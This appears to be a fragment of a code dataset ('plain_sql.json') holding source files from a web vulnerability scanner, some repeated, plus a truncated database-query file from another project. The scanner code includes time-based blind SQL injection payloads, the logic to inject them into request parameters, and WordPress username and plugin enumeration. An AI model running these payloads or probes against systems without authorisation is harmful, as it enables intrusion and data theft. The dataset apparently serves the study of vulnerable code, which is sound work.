        "source": "import time\nimport requests\nimport os\nimport logging\nimport sys\n\nclass Scanner:\n    # set frequency for update call\n    update_frequency = 0\n    name = \"\"\n    aggressive = False\n    last_update = 0\n    cache_dir = os.path.join(os.path.dirname(__file__), 'cache')\n    logger = None\n    updates = {}\n    headers = {}\n    cookies = {}\n\n    def get_version(self, url):\n        return None\n\n    def set_logger(self, log_level=logging.DEBUG):\n        self.logger = logging.getLogger(\"CMS-%s\" % self.name)\n        self.logger.setLevel(log_level)\n        ch = logging.StreamHandler(sys.stdout)\n        ch.setLevel(log_level)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        ch.setFormatter(formatter)\n        if not self.logger.handlers:\n            self.logger.addHandler(ch)\n\n    def update(self):\n        pass\n    \n    def run(self, url):\n        return {}\n\n    def get_update_cache(self):\n        if os.path.exists(self.cache_file('updates.txt')):\n            self.logger.debug(\"Reading update cache\")\n            with open(self.cache_file('updates.txt'), 'r') as f:\n                for x in f.read().strip().split('\\n'):\n                    if len(x):\n                        scanner, last_update = x.split(':')\n                        self.updates[scanner] = int(last_update)\n                    else:\n                        self.logger.warning(\"There appears to be an error in the updates cache file\")\n                        self.updates[self.name] = 0\n            if self.name in self.updates:\n                self.last_update = self.updates[self.name]\n            else:\n                self.updates[self.name] = time.time()\n        else:\n            self.logger.debug(\"No updates cache file found, creating empty one\")\n            self.updates[self.name] = time.time()\n\n    def set_update_cache(self):\n        self.logger.debug(\"Updating updates cache file\")\n        with open(self.cache_file('updates.txt'), 'w') as f:\n            for x in self.updates:\n                f.write(\"%s:%d\\n\" % (x, self.updates[x]))\n\n    def cache_file(self, r):\n        return os.path.join(self.cache_dir, r)\n\n    def setup(self):\n        if not os.path.exists(self.cache_dir):\n            self.logger.info(\"Creating cache directory\")\n            os.mkdir(self.cache_dir)\n        self.get_update_cache()\n        if self.last_update + self.update_frequency < time.time():\n            self.last_update = time.time()\n            self.updates[self.name] = time.time()\n            self.update()\n            self.set_update_cache()\n        else:\n            self.logger.debug(\"Database is up to date, skipping..\")\n\n    def get(self, url):\n        result = requests.get(url, allow_redirects=False, headers=self.headers, cookies=self.cookies)\n        return result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/libcms/scanners/wordpress.py",
        "source": "import sys, os\nsys.path.insert(0, os.path.dirname(__file__))\nimport cms_scanner\nimport re, json\ntry:\n    from urlparse import urljoin, urlparse\nexcept ImportError:\n    from urllib.parse import urljoin, urlparse\n\n\nclass Scanner(cms_scanner.Scanner):\n    plugin_update_url = \"https://data.wpscan.org/plugins.json\"\n    plugin_cache_file = \"wordpress_plugins.json\"\n\n    version_update_url = \"https://data.wpscan.org/wordpresses.json\"\n    version_cache_file = \"wordpress_versions.json\"\n\n    def __init__(self):\n        self.name = \"wordpress\"\n        self.update_frequency = 3600 * 48\n\n    def get_version(self, url):\n        text = self.get(url).text\n        version_check_1 = re.search('<meta name=\"generator\" content=\"wordpress (\\d+\\.\\d+\\.\\d+)', text, re.IGNORECASE)\n        if version_check_1:\n            return version_check_1.group(1)\n        check2_url = urljoin(url, 'wp-admin.php')\n        result = self.get(check2_url).text\n        version_check_2 = re.search('wp-admin\\.min\\.css\\?ver=(\\d+\\.\\d+\\.\\d+)', result, re.IGNORECASE)\n        if version_check_2:\n            return version_check_2.group(1)\n\n    def run(self, base):\n        self.set_logger()\n        self.setup()\n\n        version = self.get_version(base)\n        info = self.get_version_info(version)\n\n        disco = self.sub_discovery(base)\n\n        plugins = self.read_plugins()\n        plugin_data = {}\n        vulns = {}\n        for plugin in plugins:\n            plugin_version = self.get_plugin_version(base, plugin)\n            if plugin_version:\n                plugin_data[plugin] = plugin_version\n                self.logger.debug(\"Got %s as version number for plugin %s\" % (plugin_version, plugin))\n                p_vulns = self.get_vulns(plugin_version, plugins[plugin])\n                self.logger.info(\"Found %d vulns for plugin %s version %s\" % (len(p_vulns), plugin, version))\n                vulns[plugin] = p_vulns\n        return {\n            'version': version,\n            'plugins': plugin_data,\n            'plugin_vulns': vulns,\n            'version_vulns': info,\n            'discovery': disco\n        }\n\n    def get_vulns(self, version, plugin):\n        vulns = []\n        for vuln in plugin['vulnerabilities']:\n            if self.match_versions(version, vuln['fixed_in']):\n                vulns.append(vuln)\n        return vulns\n\n    def match_versions(self, version, fixed_in):\n        if version == fixed_in:\n            return False\n        parts_version = version.split('.')\n        parts_fixed_in = fixed_in.split('.')\n\n        if len(parts_version) <= len(parts_fixed_in):\n            for x in range(len(parts_version)):\n                if int(parts_version[x]) < int(parts_fixed_in[x]):\n                    return True\n                if int(parts_version[x]) > int(parts_fixed_in[x]):\n                    return False\n            return False\n\n        else:\n            for x in range(len(parts_fixed_in)):\n                if int(parts_version[x]) < int(parts_fixed_in[x]):\n                    return True\n                if int(parts_version[x]) > int(parts_fixed_in[x]):\n                    return False\n            return False\n\n    def get_version_info(self, version):\n        data = \"\"\n        with open(self.cache_file(self.version_cache_file), 'r') as f:\n            data = f.read().strip()\n        json_data = json.loads(data)\n        if version in json_data:\n            return json_data[version]\n        return None\n\n    def sub_discovery(self, base):\n        logins = []\n        get_users = self.get(urljoin(base, 'wp-json/wp/v2/users'))\n        if get_users:\n            result = json.loads(get_users.text)\n            for user in result:\n                user_id = user['id']\n                name = user['name']\n                login = user['slug']\n                logins.append({'id': user_id, 'username': login, 'name': name})\n\n        return {'users': logins}\n\n    def read_plugins(self):\n        plugins = {}\n        with open(self.cache_file(self.plugin_cache_file), 'r') as f:\n            data = f.read().strip()\n        json_data = json.loads(data)\n        for x in json_data:\n            if json_data[x]['popular'] or self.aggressive:\n                plugins[x] = json_data[x]\n        return plugins\n\n    def get_plugin_version(self, base, plugin):\n        plugin_readme_url = urljoin(base, 'wp-content/plugins/%s/readme.txt' % plugin)\n        get_result = self.get(plugin_readme_url)\n        if get_result:\n            self.logger.debug(\"Plugin %s exists, getting version from readme.txt\" % plugin)\n            text = get_result.text\n            get_version = re.search('(?s)changelog.+?(\\d+\\.\\d+(?:\\.\\d+)?)', text, re.IGNORECASE)\n            if get_version:\n                return get_version.group(1)\n        return None\n\n    def update(self):\n        try:\n            self.logger.info(\"Updating plugin files\")\n            data1 = self.get(self.plugin_update_url)\n            with open(self.cache_file(self.plugin_cache_file), 'w') as f:\n                x = data1.text.encode('ascii', 'ignore')\n                f.write(x)\n            self.logger.info(\"Updating version files\")\n            data2 = self.get(self.version_update_url)\n            with open(self.cache_file(self.version_cache_file), 'w') as f:\n                x = data2.text.encode('ascii', 'ignore')\n                f.write(x)\n            self.logger.info(\"Update complete\")\n        except Exception as e:\n            self.logger.error(\"Error updating databases\" % str(e))\n        return\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/modules/module_bsqli.py",
        "source": "import module_base\ntry:\n    from urllib import quote_plus\nexcept ImportError:\n    from urllib.parse import quote_plus\nimport requests\nimport time\nimport random\nclass Module(module_base.Base):\n    def __init__(self):\n        self.name = \"Blind SQL Injection\"\n        self.active = True\n        self.module_types = ['injection', 'dangerous']\n        self.possibilities = [\n            '\\' or sleep({sleep_value})--',\n            '\\' or sleep({sleep_value})\\\\*',\n            '-1 or sleep({sleep_value})--',\n            '-1 or sleep({sleep_value})\\\\*',\n            'aaaaa\\' or sleep({sleep_value}) or \\'a\\'=\\''\n        ]\n        self.has_read_timeout = False\n        self.timeout_state = 0\n        self.max_timeout_state = 6  # 60 secs\n        self.auto = True\n        self.headers = {}\n        self.cookies = {}\n        self.input = \"urldata\"\n        self.output = \"vulns\"\n\n    def run(self, url, data={}, headers={}, cookies={}):\n        if not self.active and 'passive' not in self.module_types:\n            # cannot send requests and not configured to do passive analysis on data\n            return\n        base, param_data = self.get_params_from_url(url)\n        self.cookies = cookies\n        self.headers = headers\n        results = []\n        if not data:\n            data = {}\n        for param in param_data:\n            result = self.inject(base, param_data, data, parameter_get=param, parameter_post=None)\n            if result:\n                results.append([url, data, 'GET', param])\n\n        for param in data:\n            result = self.inject(base, param_data, data, parameter_get=None, parameter_post=param)\n            if result:\n                results.append([url, data, 'POST', param])\n        return results\n\n    def send(self, url, params, data):\n        result = None\n        headers = self.headers\n        cookies = self.cookies\n        start = time.time()\n        # print(url, params, data)\n        try:\n            if data:\n                result = requests.post(url, params=params, data=data, headers=headers, cookies=cookies)\n            else:\n                result = requests.get(url, params=params, headers=headers, cookies=cookies)\n        except requests.Timeout:\n            if self.has_read_timeout:\n                if self.timeout_state > self.max_timeout_state:\n                    r = raw_input('The site appears to be dead, press enter to try again, q to quit') if not self.auto else \"q\"\n                    if r.strip() == \"q\":\n                        self.close()\n                        return None\n                    else:\n                        return self.send(url, params, data, headers, cookies)\n                self.timeout_state += 1\n                sleeptime = self.timeout_state * 10\n                time.sleep(sleeptime)\n                return self.send(url, params, data, headers, cookies)\n            else:\n                self.has_read_timeout = True\n                self.timeout_state = 1\n                sleeptime = self.timeout_state * 10\n                time.sleep(sleeptime)\n                return self.send(url, params, data, headers, cookies)\n        except Exception:\n            return False\n        end = time.time()\n        eslaped = end - start\n        return eslaped, result\n\n    def validate(self, url, params, data, injection_value, original_value, parameter_post=None, parameter_get=None):\n        min_wait_time = random.randint(5, 10)\n        injection_true = injection_value.replace('{sleep_value}', str(min_wait_time))\n        injection_true = injection_true.replace('{original_value}', str(original_value))\n\n        injection_false = injection_value.replace('{sleep_value}', str(0))\n        injection_false = injection_false.replace('{original_value}', str(original_value))\n\n        if parameter_get:\n            tmp = dict(params)\n            tmp[parameter_get] = injection_true\n            result = self.send(url, params, tmp)\n            if result:\n                eslaped, object = result\n                if eslaped > min_wait_time:\n                    tmp = dict(params)\n                    tmp[parameter_get] = injection_false\n                    result = self.send(url, tmp, data)\n                    if result:\n                        eslaped, object = result\n                        if eslaped < min_wait_time:\n                            return True\n                        else:\n                            return False\n                else:\n                    return False\n        else:\n            postenc = self.params_to_url(\"\", data)[1:]\n            tmp = dict(data)\n            tmp[parameter_post] = injection_true\n            result = self.send(url, params, tmp)\n            if result:\n                eslaped, object = result\n                if eslaped > min_wait_time:\n                    tmp = dict(params)\n                    tmp[parameter_post] = injection_false\n                    result = self.send(url, params, tmp)\n                    if result:\n                        eslaped, object = result\n                        if eslaped < min_wait_time:\n                            return True\n                    else:\n                        return False\n                else:\n                    return False\n\n    def inject(self, url, params, data=None, parameter_get=None, parameter_post=None):\n        if parameter_get:\n            tmp = dict(params)\n            for injection_value in self.possibilities:\n                min_wait_time = random.randint(5, 10)\n                payload = injection_value.replace('{sleep_value}', str(min_wait_time))\n                payload = payload.replace('{original_value}', str(params[parameter_get]))\n                tmp[parameter_get] = payload\n                result = self.send(url, tmp, data)\n                if result:\n                    eslaped, object = result\n                    if eslaped > min_wait_time:\n                        if self.validate(url, params, data, injection_value, original_value=params[parameter_get], parameter_post=None,\n                                      parameter_get=parameter_get):\n                            return True\n            return False\n        if parameter_post:\n            tmp = dict(data)\n            for injection_value in self.possibilities:\n                min_wait_time = random.randint(5, 10)\n                payload = injection_value.replace('{sleep_value}', str(min_wait_time))\n                payload = payload.replace('{original_value}', str(data[parameter_post]))\n                tmp[parameter_post] = payload\n                result = self.send(url, params, tmp)\n                if result:\n                    eslaped, object = result\n                    if eslaped > min_wait_time:\n                        if self.validate(url, params, data, injection_value, original_value=data[parameter_post], parameter_post=parameter_post,\n                                      parameter_get=None):\n                            return True\n            return False\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/libcms/cms_scanner_core.py",
        "source": "import os\nimport logging\nimport sys\nfrom detector import CMSDetector\n\nclass CustomModuleLoader:\n    folder = \"\"\n    blacklist = ['cms_scanner.py', '__init__.py']\n    modules = []\n    logger = None\n    is_aggressive = False\n    module = None\n\n    def __init__(self, folder='scanners', blacklist=[], is_aggressive=False, log_level=logging.INFO):\n        self.blacklist.extend(blacklist)\n        self.folder = os.path.join(os.path.dirname(__file__), folder)\n        self.logger = logging.getLogger(\"CMS Scanner\")\n        self.logger.setLevel(log_level)\n        ch = logging.StreamHandler(sys.stdout)\n        ch.setLevel(log_level)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        ch.setFormatter(formatter)\n        self.logger.addHandler(ch)\n        self.logger.debug(\"Loading CMS scripts\")\n        self.is_aggressive = is_aggressive\n\n    def load(self, script, name):\n        sys.path.insert(0, os.path.dirname(__file__))\n        base = script.replace('.py', '')\n        try:\n            command_module = __import__(\"scanners.%s\" % base, fromlist=[\"scanners\"])\n            module = command_module.Scanner()\n            if module.name == name:\n                self.module = module\n                self.module.set_logger(self.logger.getEffectiveLevel())\n                self.logger.debug(\"Selected %s for target\" % name)\n        except ImportError as e:\n            self.logger.warning(\"Error importing script:%s %s\" % (base, str(e)))\n        except Exception as e:\n            self.logger.warning(\"Error loading script:%s %s\" % (base, str(e)))\n\n    def load_modules(self, name):\n        for f in os.listdir(self.folder):\n            if not f.endswith('.py'):\n                continue\n            if f in self.blacklist:\n                continue\n            self.load(f, name)\n\n    def run_scripts(self, base, headers={}, cookies={}):\n        p = CMSDetector()\n        cms = p.scan(base)\n        if cms:\n            self.logger.debug(\"Detected %s as active CMS\" % cms)\n            self.load_modules(cms)\n            if self.module:\n                results = self.module.run(base)\n                return {cms: results}\n            else:\n                self.logger.warning(\"No script was found for CMS %s\" % cms)\n        else:\n            self.logger.info(\"No cms was detected on target %s\" % base)\n        return None\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/libcms/scanners/cms_scanner.py",
        "source": "import time\nimport requests\nimport os\nimport logging\nimport sys\n\nclass Scanner:\n    # set frequency for update call\n    update_frequency = 0\n    name = \"\"\n    aggressive = False\n    last_update = 0\n    cache_dir = os.path.join(os.path.dirname(__file__), 'cache')\n    logger = None\n    updates = {}\n    headers = {}\n    cookies = {}\n\n    def get_version(self, url):\n        return None\n\n    def set_logger(self, log_level=logging.DEBUG):\n        self.logger = logging.getLogger(\"CMS-%s\" % self.name)\n        self.logger.setLevel(log_level)\n        ch = logging.StreamHandler(sys.stdout)\n        ch.setLevel(log_level)\n        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        ch.setFormatter(formatter)\n        if not self.logger.handlers:\n            self.logger.addHandler(ch)\n\n    def update(self):\n        pass\n    \n    def run(self, url):\n        return {}\n\n    def get_update_cache(self):\n        if os.path.exists(self.cache_file('updates.txt')):\n            self.logger.debug(\"Reading update cache\")\n            with open(self.cache_file('updates.txt'), 'r') as f:\n                for x in f.read().strip().split('\\n'):\n                    if len(x):\n                        scanner, last_update = x.split(':')\n                        self.updates[scanner] = int(last_update)\n                    else:\n                        self.logger.warning(\"There appears to be an error in the updates cache file\")\n                        self.updates[self.name] = 0\n            if self.name in self.updates:\n                self.last_update = self.updates[self.name]\n            else:\n                self.updates[self.name] = time.time()\n        else:\n            self.logger.debug(\"No updates cache file found, creating empty one\")\n            self.updates[self.name] = time.time()\n\n    def set_update_cache(self):\n        self.logger.debug(\"Updating updates cache file\")\n        with open(self.cache_file('updates.txt'), 'w') as f:\n            for x in self.updates:\n                f.write(\"%s:%d\\n\" % (x, self.updates[x]))\n\n    def cache_file(self, r):\n        return os.path.join(self.cache_dir, r)\n\n    def setup(self):\n        if not os.path.exists(self.cache_dir):\n            self.logger.info(\"Creating cache directory\")\n            os.mkdir(self.cache_dir)\n        self.get_update_cache()\n        if self.last_update + self.update_frequency < time.time():\n            self.last_update = time.time()\n            self.updates[self.name] = time.time()\n            self.update()\n            self.set_update_cache()\n        else:\n            self.logger.debug(\"Database is up to date, skipping..\")\n\n    def get(self, url):\n        result = requests.get(url, allow_redirects=False, headers=self.headers, cookies=self.cookies)\n        return result",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/libcms/scanners/wordpress.py",
        "source": "import sys, os\nsys.path.insert(0, os.path.dirname(__file__))\nimport cms_scanner\nimport re, json\ntry:\n    from urlparse import urljoin, urlparse\nexcept ImportError:\n    from urllib.parse import urljoin, urlparse\n\n\nclass Scanner(cms_scanner.Scanner):\n    plugin_update_url = \"https://data.wpscan.org/plugins.json\"\n    plugin_cache_file = \"wordpress_plugins.json\"\n\n    version_update_url = \"https://data.wpscan.org/wordpresses.json\"\n    version_cache_file = \"wordpress_versions.json\"\n\n    def __init__(self):\n        self.name = \"wordpress\"\n        self.update_frequency = 3600 * 48\n\n    def get_version(self, url):\n        text = self.get(url).text\n        version_check_1 = re.search('<meta name=\"generator\" content=\"wordpress (\\d+\\.\\d+\\.\\d+)', text, re.IGNORECASE)\n        if version_check_1:\n            return version_check_1.group(1)\n        check2_url = urljoin(url, 'wp-admin.php')\n        result = self.get(check2_url).text\n        version_check_2 = re.search('wp-admin\\.min\\.css\\?ver=(\\d+\\.\\d+\\.\\d+)', result, re.IGNORECASE)\n        if version_check_2:\n            return version_check_2.group(1)\n\n    def run(self, base):\n        self.set_logger()\n        self.setup()\n\n        version = self.get_version(base)\n        info = self.get_version_info(version)\n\n        disco = self.sub_discovery(base)\n\n        plugins = self.read_plugins()\n        plugin_data = {}\n        vulns = {}\n        for plugin in plugins:\n            plugin_version = self.get_plugin_version(base, plugin)\n            if plugin_version:\n                plugin_data[plugin] = plugin_version\n                self.logger.debug(\"Got %s as version number for plugin %s\" % (plugin_version, plugin))\n                p_vulns = self.get_vulns(plugin_version, plugins[plugin])\n                self.logger.info(\"Found %d vulns for plugin %s version %s\" % (len(p_vulns), plugin, version))\n                vulns[plugin] = p_vulns\n        return {\n            'version': version,\n            'plugins': plugin_data,\n            'plugin_vulns': vulns,\n            'version_vulns': info,\n            'discovery': disco\n        }\n\n    def get_vulns(self, version, plugin):\n        vulns = []\n        for vuln in plugin['vulnerabilities']:\n            if self.match_versions(version, vuln['fixed_in']):\n                vulns.append(vuln)\n        return vulns\n\n    def match_versions(self, version, fixed_in):\n        if version == fixed_in:\n            return False\n        parts_version = version.split('.')\n        parts_fixed_in = fixed_in.split('.')\n\n        if len(parts_version) <= len(parts_fixed_in):\n            for x in range(len(parts_version)):\n                if int(parts_version[x]) < int(parts_fixed_in[x]):\n                    return True\n                if int(parts_version[x]) > int(parts_fixed_in[x]):\n                    return False\n            return False\n\n        else:\n            for x in range(len(parts_fixed_in)):\n                if int(parts_version[x]) < int(parts_fixed_in[x]):\n                    return True\n                if int(parts_version[x]) > int(parts_fixed_in[x]):\n                    return False\n            return False\n\n    def get_version_info(self, version):\n        data = \"\"\n        with open(self.cache_file(self.version_cache_file), 'r') as f:\n            data = f.read().strip()\n        json_data = json.loads(data)\n        if version in json_data:\n            return json_data[version]\n        return None\n\n    def sub_discovery(self, base):\n        logins = []\n        get_users = self.get(urljoin(base, 'wp-json/wp/v2/users'))\n        if get_users:\n            result = json.loads(get_users.text)\n            for user in result:\n                user_id = user['id']\n                name = user['name']\n                login = user['slug']\n                logins.append({'id': user_id, 'username': login, 'name': name})\n\n        return {'users': logins}\n\n    def read_plugins(self):\n        plugins = {}\n        with open(self.cache_file(self.plugin_cache_file), 'r') as f:\n            data = f.read().strip()\n        json_data = json.loads(data)\n        for x in json_data:\n            if json_data[x]['popular'] or self.aggressive:\n                plugins[x] = json_data[x]\n        return plugins\n\n    def get_plugin_version(self, base, plugin):\n        plugin_readme_url = urljoin(base, 'wp-content/plugins/%s/readme.txt' % plugin)\n        get_result = self.get(plugin_readme_url)\n        if get_result:\n            self.logger.debug(\"Plugin %s exists, getting version from readme.txt\" % plugin)\n            text = get_result.text\n            get_version = re.search('(?s)changelog.+?(\\d+\\.\\d+(?:\\.\\d+)?)', text, re.IGNORECASE)\n            if get_version:\n                return get_version.group(1)\n        return None\n\n    def update(self):\n        try:\n            self.logger.info(\"Updating plugin files\")\n            data1 = self.get(self.plugin_update_url)\n            with open(self.cache_file(self.plugin_cache_file), 'w') as f:\n                x = data1.text.encode('ascii', 'ignore')\n                f.write(x)\n            self.logger.info(\"Updating version files\")\n            data2 = self.get(self.version_update_url)\n            with open(self.cache_file(self.version_cache_file), 'w') as f:\n                x = data2.text.encode('ascii', 'ignore')\n                f.write(x)\n            self.logger.info(\"Update complete\")\n        except Exception as e:\n            self.logger.error(\"Error updating databases\" % str(e))\n        return\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/stefan2200/Helios/blob/080f957fd0f1e5f34d1584f1937d49e730bcdff6",
        "file_path": "/modules/module_bsqli.py",
        "source": "import module_base\ntry:\n    from urllib import quote_plus\nexcept ImportError:\n    from urllib.parse import quote_plus\nimport requests\nimport time\nimport random\nclass Module(module_base.Base):\n    def __init__(self):\n        self.name = \"Blind SQL Injection\"\n        self.active = True\n        self.module_types = ['injection', 'dangerous']\n        self.possibilities = [\n            '\\' or sleep({sleep_value})--',\n            '\\' or sleep({sleep_value})\\\\*',\n            '-1 or sleep({sleep_value})--',\n            '-1 or sleep({sleep_value})\\\\*',\n            'aaaaa\\' or sleep({sleep_value}) or \\'a\\'=\\''\n        ]\n        self.has_read_timeout = False\n        self.timeout_state = 0\n        self.max_timeout_state = 6  # 60 secs\n        self.auto = True\n        self.headers = {}\n        self.cookies = {}\n        self.input = \"urldata\"\n        self.output = \"vulns\"\n\n    def run(self, url, data={}, headers={}, cookies={}):\n        if not self.active and 'passive' not in self.module_types:\n            # cannot send requests and not configured to do passive analysis on data\n            return\n        base, param_data = self.get_params_from_url(url)\n        self.cookies = cookies\n        self.headers = headers\n        results = []\n        if not data:\n            data = {}\n        for param in param_data:\n            result = self.inject(base, param_data, data, parameter_get=param, parameter_post=None)\n            if result:\n                results.append([url, data, 'GET', param])\n\n        for param in data:\n            result = self.inject(base, param_data, data, parameter_get=None, parameter_post=param)\n            if result:\n                results.append([url, data, 'POST', param])\n        return results\n\n    def send(self, url, params, data):\n        result = None\n        headers = self.headers\n        cookies = self.cookies\n        start = time.time()\n        # print(url, params, data)\n        try:\n            if data:\n                result = requests.post(url, params=params, data=data, headers=headers, cookies=cookies)\n            else:\n                result = requests.get(url, params=params, headers=headers, cookies=cookies)\n        except requests.Timeout:\n            if self.has_read_timeout:\n                if self.timeout_state > self.max_timeout_state:\n                    r = raw_input('The site appears to be dead, press enter to try again, q to quit') if not self.auto else \"q\"\n                    if r.strip() == \"q\":\n                        self.close()\n                        return None\n                    else:\n                        return self.send(url, params, data, headers, cookies)\n                self.timeout_state += 1\n                sleeptime = self.timeout_state * 10\n                time.sleep(sleeptime)\n                return self.send(url, params, data, headers, cookies)\n            else:\n                self.has_read_timeout = True\n                self.timeout_state = 1\n                sleeptime = self.timeout_state * 10\n                time.sleep(sleeptime)\n                return self.send(url, params, data, headers, cookies)\n        except Exception:\n            return False\n        end = time.time()\n        eslaped = end - start\n        return eslaped, result\n\n    def validate(self, url, params, data, injection_value, original_value, parameter_post=None, parameter_get=None):\n        min_wait_time = random.randint(5, 10)\n        injection_true = injection_value.replace('{sleep_value}', str(min_wait_time))\n        injection_true = injection_true.replace('{original_value}', str(original_value))\n\n        injection_false = injection_value.replace('{sleep_value}', str(0))\n        injection_false = injection_false.replace('{original_value}', str(original_value))\n\n        if parameter_get:\n            tmp = dict(params)\n            tmp[parameter_get] = injection_true\n            result = self.send(url, params, tmp)\n            if result:\n                eslaped, object = result\n                if eslaped > min_wait_time:\n                    tmp = dict(params)\n                    tmp[parameter_get] = injection_false\n                    result = self.send(url, tmp, data)\n                    if result:\n                        eslaped, object = result\n                        if eslaped < min_wait_time:\n                            return True\n                        else:\n                            return False\n                else:\n                    return False\n        else:\n            postenc = self.params_to_url(\"\", data)[1:]\n            tmp = dict(data)\n            tmp[parameter_post] = injection_true\n            result = self.send(url, params, tmp)\n            if result:\n                eslaped, object = result\n                if eslaped > min_wait_time:\n                    tmp = dict(params)\n                    tmp[parameter_post] = injection_false\n                    result = self.send(url, params, tmp)\n                    if result:\n                        eslaped, object = result\n                        if eslaped < min_wait_time:\n                            return True\n                    else:\n                        return False\n                else:\n                    return False\n\n    def inject(self, url, params, data=None, parameter_get=None, parameter_post=None):\n        if parameter_get:\n            tmp = dict(params)\n            for injection_value in self.possibilities:\n                min_wait_time = random.randint(5, 10)\n                payload = injection_value.replace('{sleep_value}', str(min_wait_time))\n                payload = payload.replace('{original_value}', str(params[parameter_get]))\n                tmp[parameter_get] = payload\n                result = self.send(url, tmp, data)\n                if result:\n                    eslaped, object = result\n                    if eslaped > min_wait_time:\n                        if self.validate(url, params, data, injection_value, original_value=params[parameter_get], parameter_post=None,\n                                      parameter_get=parameter_get):\n                            return True\n            return False\n        if parameter_post:\n            tmp = dict(data)\n            for injection_value in self.possibilities:\n                min_wait_time = random.randint(5, 10)\n                payload = injection_value.replace('{sleep_value}', str(min_wait_time))\n                payload = payload.replace('{original_value}', str(data[parameter_post]))\n                tmp[parameter_post] = payload\n                result = self.send(url, params, tmp)\n                if result:\n                    eslaped, object = result\n                    if eslaped > min_wait_time:\n                        if self.validate(url, params, data, injection_value, original_value=data[parameter_post], parameter_post=parameter_post,\n                                      parameter_get=None):\n                            return True\n            return False\n\n\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dssg/matching-tool/blob/a62af474a4019d43287a05ce671e0ab7ee567b61",
        "file_path": "/webapp/webapp/apis/query.py",
        "source": "import logging\nimport pandas as pd\nfrom webapp import db, app\nfrom webapp.utils import generate_matched_table_name, table_exists\nfrom collections import OrderedDict\nfrom webapp.logger import logger\nimport numpy as np\n\n\ndef get_histogram_bar_chart_data(data, distribution_function, shared_ids, data_name):\n    intersection_data = data[data.matched_id.isin(shared_ids)]\n    distribution, groups = distribution_function(data)\n    distribution_intersection, _ = distribution_function(intersection_data, groups)\n    bins = []\n    logger.info(data_name)\n    #logger.info(distribution)\n    logger.info(distribution_intersection)\n    logger.info(len(data.matched_id.unique()))\n    for bin_index in range(len(distribution)):\n        try:\n            of_status = {\n                \"x\": data_name,\n                \"y\": int(distribution.iloc[bin_index])/len(data.matched_id.unique())*100\n            }\n        except ZeroDivisionError:\n            of_status = {\n                \"x\": data_name,\n                \"y\": 0\n            }\n        try:\n            all_status = {\n                \"x\": \"Jail & Homeless\",\n                \"y\": int(distribution_intersection.iloc[bin_index])/len(intersection_data.matched_id.unique())*100\n            }\n        except:\n            all_status = {\n                \"x\": \"Jail & Homeless\",\n                \"y\": 0\n            }\n        bins.append((of_status, all_status))\n    return [bins, list(distribution.index)]\n\n\ndef window(iterable, size=2):\n    i = iter(iterable)\n    win = []\n    for e in range(0, size):\n        win.append(next(i))\n    yield win\n    for e in i:\n        win = win[1:] + [e]\n        yield win\n\n\ndef get_contact_dist(data, bins=None):\n    data = data.groupby('matched_id').matched_id.count().as_matrix()\n    data = data.astype(int)\n    one_contact = list(data).count(1)\n    rest = np.delete(data, np.argwhere(data==1))\n    if one_contact == len(data):\n        df_hist = pd.DataFrame({'contacts': [one_contact]}, index=['1 contact'])\n        logger.info(\"all ones!\")\n        return df_hist, 1\n\n    if bins is not None:\n        num, groups = np.histogram(rest, bins)\n    else:\n        num, groups = np.histogram(rest, 'auto')\n        if len(groups) > 4:\n            bins = 4\n            num, groups = np.histogram(rest, bins)\n    hist = [one_contact] + list(num)\n    index = [pd.Interval(1, 2, 'left')] + [pd.Interval(int(b[0]), int(b[1])+1, 'left') for b in list(window(list(groups), 2))]\n    df_hist = pd.DataFrame({'contacts': hist}, index=contacts_interval_to_text(index))\n    logger.info(num)\n    logger.info(groups)\n    logger.info(index)\n    logger.info(df_hist)\n    return df_hist, groups\n\n\ndef get_days_distribution(data, groups=None):\n    dist = pd.cut(\n            data.groupby('matched_id').days.sum(),\n            [0, 1, 2, 10, 90, 1000],\n            right=False\n        ).value_counts(sort=False)\n    dist = pd.DataFrame({'days': dist.as_matrix()}, index=days_interval_to_text(dist.index))\n    return dist, []\n\n\ndef contacts_interval_to_text(interval_list):\n    result = ['1 contact']\n    for c, i in enumerate(interval_list[1:], 1):\n        if c == 1:\n            if i.right == 3:\n                result.append(f\"2 contacts\")\n            else:\n                result.append(f\"{i.left}-{i.right - 1 if i.open_right else i.right} contacts\")\n        else:\n            if i.left + 1 == i.right - 1:\n                result.append(f\"{i.left + 1} contacts\")\n            else:\n                result.append(f\"{i.left + 1}-{i.right - 1 if i.open_right else i.right} contacts\")\n    return result\n\n\ndef days_interval_to_text(interval_list):\n    result = ['< 1 day', '1 day']\n    for i in interval_list[2:-1]:\n        result.append(f\"{i.left}-{i.right - 1 if i.open_right else i.right} days\")\n\n    result = result + ['90+ days']\n    return result\n\n\ndef get_records_by_time(\n    start_time,\n    end_time,\n    jurisdiction,\n    limit,\n    offset,\n    order_column,\n    order,\n    set_status\n):\n    matched_hmis_table = generate_matched_table_name(jurisdiction, 'hmis_service_stays')\n    matched_bookings_table = generate_matched_table_name(jurisdiction, 'jail_bookings')\n    hmis_exists = table_exists(matched_hmis_table, db.engine)\n    bookings_exists = table_exists(matched_bookings_table, db.engine)\n    if not hmis_exists:\n        raise ValueError('HMIS matched table {} does not exist. Please try again later.'.format(matched_hmis_table))\n    if not bookings_exists:\n        raise ValueError('Bookings matched table {} does not exist. Please try again later.'.format(matched_bookings_table))\n    columns = [\n        (\"matched_id\", 'matched_id'),\n        (\"coalesce(hmis_summary.first_name, jail_summary.first_name)\", 'first_name'),\n        